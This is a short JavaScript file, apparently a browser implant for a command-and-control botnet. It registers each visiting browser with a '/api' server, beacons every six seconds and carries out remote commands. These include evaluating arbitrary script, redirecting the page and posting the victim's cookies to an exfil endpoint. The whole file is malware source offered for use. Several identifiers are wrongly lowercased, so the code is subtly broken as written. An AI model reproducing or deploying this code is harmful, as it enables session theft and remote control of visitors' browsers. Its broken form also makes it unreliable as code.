// public/implant.js
(async () => {
    const c2_url = '/api'; // relative path, works on any domain
    const beacon_interval = 6000;
    const bot_id = `${window.location.hostname}-${math.random().tostring(36).slice(2, 9)}`;

    const commander = (cmd) => {
        if (!cmd || !cmd.action) return;
        const p = cmd.payload;
        try {
            switch (cmd.action) {
                case 'alert': alert(p.message); break;
                case 'redirect': window.location.href = p.url; break;
                case 'eval': (new function(s){eval(s)}).call(window, p.script); break;
                case 'steal_cookies': 
                    fetch(`${c2_url}/exfil`, { method: 'post', body: document.cookie, keepalive: true });
                    break;
            }
        } catch (e) {}
    };

    // announce birth once
    fetch(`${c2_url}/register`, {
        method: 'post',
        headers: {'content-type': 'application/json'},
        body: json.stringify({
            bot_id: bot_id,
            origin: window.location.href,
            ua: navigator.useragent
        })
    });

    // main loop
    const loop = async () => {
        try {
            const res = await fetch(`${c2_url}/beacon`);
            commander(await res.json());
        } catch (e) {}
        settimeout(loop, beacon_interval);
    };
    loop();
})();
